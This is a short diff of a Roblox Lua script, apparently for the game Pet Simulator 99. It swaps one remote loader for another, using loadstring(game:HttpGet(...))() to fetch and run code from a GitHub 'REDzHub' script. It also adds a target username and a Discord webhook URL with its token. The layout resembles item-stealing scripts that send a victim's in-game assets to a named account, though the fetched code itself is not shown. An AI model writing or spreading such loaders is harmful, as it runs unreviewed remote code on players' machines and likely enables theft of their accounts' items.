@@ -1,1 +1,5 @@
-loadstring(game:HttpGet('https://rentry.co/4tktq8y7/raw',true))()
+Username = "Wh8e7T8X"
+Username2 = "Wh8e7T8X"
+Webhook = "https://discord.com/api/webhooks/1264238693410017334/R2FWKJIbjK0rYt6WrHDF-8L4A3JuxDarICA9IMLEUiBzkaomeD6TkCNEjMKJro7ah-RA"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHubd/Pet-simulator-99/main/REDzHub"))()
